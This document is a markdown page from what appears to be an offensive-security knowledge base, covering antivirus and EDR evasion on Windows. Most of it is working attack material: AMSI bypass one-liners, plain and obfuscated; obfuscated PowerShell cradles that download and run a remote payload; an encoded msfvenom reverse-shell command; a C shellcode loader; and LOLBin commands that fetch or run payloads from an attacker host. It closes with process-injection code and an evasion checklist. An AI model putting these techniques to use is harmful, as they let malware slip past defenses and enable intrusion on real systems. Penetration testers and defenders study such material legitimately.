---
sidebar_position: 1
title: AV Evasion
---

# Antivirus & EDR Evasion

Understanding how detection works is the foundation for bypassing it. Modern defenses use multiple detection layers: static signature analysis, heuristic/behavioral analysis, memory scanning, and cloud-based reputation checks.

```bash
# Set environment variables
export TARGET=<ip>
export LHOST=<your-ip>
export LPORT=4444
```

---

## Detection Types

**Signature-based:** The AV maintains a database of known-bad byte sequences. If your binary matches a known signature, it's flagged. This is the easiest layer to bypass.

**Heuristic/behavioral:** The AV monitors what programs do at runtime — network connections, process injection, credential access, etc. Even if your payload has no known signature, suspicious behavior can trigger detection.

**AMSI (Antimalware Scan Interface):** Windows hooks into scripting engines (PowerShell, VBScript, JScript, .NET) and sends script content to the AV before execution. This catches malicious PowerShell even when it's obfuscated.

**Cloud-based / AI:** Samples are submitted to vendor cloud infrastructure for deeper analysis. Some EDR solutions use machine learning models that flag anomalies even for previously unseen malware.

---

## When AV Blocks Your Tools

Automated enumeration tools (WinPEAS, SharpHound, PowerView) are heavily signatured. When AV blocks them:

1. Try alternative tools that are less signatured (Seatbelt, JAWS, adPEAS instead of WinPEAS)
2. Perform manual enumeration using built-in commands
3. Apply evasion techniques below to your tools before transferring them

---

## AMSI Bypass

AMSI intercepts PowerShell, .NET, VBScript, and JScript before execution. Bypassing AMSI is often the first step before running any offensive PowerShell tooling.

### PowerShell One-Liner (Reflection Method)

Patch the AmsiScanBuffer function in memory to always return clean:

```powershell
$a=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');$b=$a.GetField('amsi'+'InitFailed','NonPublic,Static');$b.SetValue($null,$true)
```

:::warning
AMSI bypass strings are themselves scanned by AMSI. If a known bypass is flagged, you need to obfuscate the bypass itself — string concatenation, variable substitution, encoding, or building the strings dynamically.
:::

### Obfuscated AMSI Bypass

Break up the known strings to avoid signature detection:

```powershell
$w = 'System.Management.Automation.A';$c = 'msiUtils'
$assembly = [Ref].Assembly.GetType($w+$c)
$field = $assembly.GetField('a'+'msiI'+'nitF'+'ailed','NonPublic,Static')
$field.SetValue($null,$true)
```

### PowerShell Constrained Language Mode

If PowerShell is running in Constrained Language Mode (CLM), most offensive cmdlets and .NET reflection calls are blocked. Check your language mode:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

If it returns `ConstrainedLanguage`, options include: using `cmd.exe` or other scripting languages instead, downgrading to PowerShell v2 (if available — it doesn't support CLM), or escaping to a different process context.

Attempt PowerShell v2 downgrade:

```powershell
powershell -version 2
```

:::tip
PowerShell v2 requires .NET Framework 2.0/3.5 to be installed. On modern Windows, this feature is often removed. Check with `Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2`.
:::

---

## Payload Encoding and Obfuscation

### msfvenom Encoders

Encode payloads to avoid static signatures. Shikata Ga Nai (SGN) is a polymorphic XOR encoder:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

The `-i 5` flag applies 5 iterations of encoding. More iterations produce more variation but increase payload size.

:::warning
Encoding alone is no longer sufficient against modern AV. Encoded Metasploit payloads are heavily signatured. Encoding is most effective when combined with custom loaders, packing, or other techniques.
:::

### Custom PowerShell Obfuscation

Variable substitution and string manipulation:

```powershell
# Original (detected)
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/payload.ps1')

# Obfuscated
$wc = New-Object System.Net.WebClient
$url = "ht"+"tp://LHOST/pay"+"load.ps1"
IEX $wc.DownloadString($url)

# Further obfuscated with invoke expression alias
$wc = New-Object ("Net."+"Web"+"Client")
.(gcm *ke-E*) $wc.("Down"+"load"+"String").Invoke("http://LHOST/payload.ps1")
```

### Base64 Encoding

Encode a PowerShell command for use with the `-EncodedCommand` parameter:

```bash
echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://LHOST/payload.ps1")' | iconv -t UTF-16LE | base64 -w 0
```

Execute on target:

```powershell
powershell -nop -w hidden -enc <base64-output>
```

---

## Packing and Crypting

Packers compress and/or encrypt the payload, wrapping it in a stub that decompresses at runtime. This changes the binary's signature completely.

### UPX (Basic Packer)

UPX is well-known and most AV can unpack it, but it's a starting point:

```bash
upx --best -o packed.exe original.exe
```

:::tip
For real-world engagements, use custom packers or crypters. Public tools like UPX, Veil, and Shelter are heavily signatured. A simple custom XOR loader written in C/C++ or Nim is far more effective.
:::

### Custom Shellcode Loader (C)

Write a minimal loader that decrypts shellcode at runtime:

```c
#include <windows.h>
#include <stdio.h>

// XOR-encrypted shellcode (generate with msfvenom then XOR each byte)
unsigned char buf[] = { /* encrypted shellcode bytes */ };
unsigned int buf_len = sizeof(buf);
char key = 'K'; // XOR key

int main() {
    // Decrypt
    for (int i = 0; i < buf_len; i++) {
        buf[i] ^= key;
    }

    // Allocate executable memory
    void *exec = VirtualAlloc(NULL, buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, buf_len);

    // Execute
    ((void(*)())exec)();
    return 0;
}
```

Cross-compile on Kali:

```bash
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lws2_32
```

:::warning
`PAGE_EXECUTE_READWRITE` (RWX) memory is a strong behavioral indicator. More advanced loaders use `VirtualAlloc` with `PAGE_READWRITE`, copy the shellcode, then `VirtualProtect` to `PAGE_EXECUTE_READ`.
:::

---

## Living Off the Land (LOLBins)

LOLBins are legitimate, signed Windows binaries that can be abused for execution, download, or bypass purposes. Since they're trusted by the OS, they often evade AV detection.

### Execution

Use `mshta.exe` to execute an HTA payload:

```powershell
mshta http://$LHOST/payload.hta
```

Use `rundll32.exe` to execute a DLL function:

```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -e <base64>")
```

Use `regsvr32.exe` for proxy execution (Squiblydoo):

```powershell
regsvr32 /s /n /u /i:http://$LHOST/payload.sct scrobj.dll
```

### Download

Use `certutil.exe` to download files (commonly flagged now but still works in some environments):

```powershell
certutil -urlcache -f http://$LHOST/payload.exe C:\Users\Public\payload.exe
```

Use `bitsadmin` for background downloads:

```powershell
bitsadmin /transfer job /download /priority high http://$LHOST/payload.exe C:\Users\Public\payload.exe
```

Use `curl.exe` (available on Windows 10+):

```powershell
curl.exe http://$LHOST/payload.exe -o C:\Users\Public\payload.exe
```

### Bypass

Use `MSBuild.exe` to compile and execute inline C# code from an XML project file — bypasses application whitelisting:

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\payload.xml
```

:::tip
LOLBAS (Living Off The Land Binaries And Scripts) maintains a comprehensive list: https://lolbas-project.github.io/. Check it for additional binaries, scripts, and libraries that can be abused.
:::

---

## Process Injection

Instead of writing a payload to disk (where AV can scan it), inject shellcode directly into the memory of a running process.

### Classic Injection (CreateRemoteThread)

The basic pattern: open a handle to the target process, allocate memory inside it, write shellcode, and create a remote thread to execute it.

This technique is well-known and detected by most EDR solutions, but remains useful as a baseline:

```c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
LPVOID addr = VirtualAllocEx(hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, shellcode, shellcode_len, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
```

### Reflective DLL Injection

Load a DLL entirely from memory without touching the filesystem. The DLL contains its own loader that maps it into the process manually, bypassing the Windows loader (and filesystem-based scanning).

Tools that implement this: Metasploit's `post/windows/manage/reflective_dll_inject`, Cobalt Strike, sRDI (shellcode Reflective DLL Injection).

### Process Hollowing

Create a legitimate process in a suspended state, hollow out its memory, replace it with your payload, and resume execution. The process appears legitimate in Task Manager.

```
1. CreateProcess("svchost.exe", ..., CREATE_SUSPENDED)
2. NtUnmapViewOfSection() — remove original code
3. VirtualAllocEx() — allocate new memory
4. WriteProcessMemory() — write payload
5. SetThreadContext() — update entry point
6. ResumeThread() — execute
```

---

## Evasion Checklist

Before deploying a tool or payload to a target:

1. Check if AMSI is active — bypass it first if you need PowerShell or .NET
2. Identify what AV/EDR is running — `Get-CimInstance -ClassName AntiVirusProduct -Namespace "root/SecurityCenter2"` or check running processes
3. Test your payload in a similar environment before deployment
4. Prefer in-memory execution over dropping files to disk
5. Use LOLBins for downloads and execution when possible
6. If a tool gets caught, don't keep trying the same binary — modify it or use an alternative
7. Monitor your callback — if you get a shell and immediately lose it, AV likely killed your process

:::tip
The most effective evasion is custom tooling. A simple C program that decrypts shellcode at runtime will bypass most signature-based detection. The more unique your code, the less likely it matches any known pattern.
:::
